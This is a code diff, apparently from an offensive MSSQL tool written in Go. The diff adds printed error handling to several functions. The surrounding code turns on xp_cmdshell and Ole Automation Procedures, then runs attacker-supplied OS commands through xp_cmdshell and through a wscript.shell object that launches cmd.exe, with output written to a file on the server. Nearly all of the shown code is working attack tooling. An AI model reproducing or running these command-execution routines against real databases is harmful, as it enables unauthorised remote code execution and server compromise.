@@ -36,7 +36,10 @@ func Msscon() (*sql.DB, error) {
 }
 
 func Mssquery() {
-	conn, _ := Msscon()
+	conn, err := Msscon()
+	if err != nil {
+		fmt.Println(err)
+	}
 	stmt, err := conn.Prepare(`SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = 'U' and sysstat<200`)
 	if err != nil {
 		log.Fatal("Prepare failed:", err.Error())
@@ -68,7 +71,10 @@ func Mssquery() {
 }
 
 func Msscfg() {
-	conn, _ := Msscon()
+	conn, err := Msscon()
+	if err != nil {
+		fmt.Println(err)
+	}
 	for i := range cfgquery {
 		stmt, err := conn.Prepare(cfgquery[i])
 		if err != nil {
@@ -102,7 +108,10 @@ func Msscfg() {
 }
 
 func Cmdshell() {
-	conn, _ := Msscon()
+	conn, err := Msscon()
+	if err != nil {
+		fmt.Println(err)
+	}
 	conn.Query(";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--")
 	Code := fmt.Sprintf("exec master..xp_cmdshell '%v'", common.Code)
 	stmt, err := conn.Prepare(Code)
@@ -136,7 +145,10 @@ func Cmdshell() {
 }
 
 func Oleshell() {
-	conn, _ := Msscon()
+	conn, err := Msscon()
+	if err != nil {
+		fmt.Println(err)
+	}
 	conn.Query("exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ole Automation Procedures',1;reconfigure;--")
 	Code := fmt.Sprintf("declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c %v >c:\\\\1.txt'", common.Code)
 	stmt, err := conn.Prepare(Code)
@@ -170,7 +182,10 @@ func Oleshell() {
 }
 
 func CLR() {
-	conn, _ := Msscon()
+	conn, err := Msscon()
+	if err != nil {
+		fmt.Println(err)
+	}
 	conn.Query("exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ole Automation Procedures',1;reconfigure;--")
 
 }
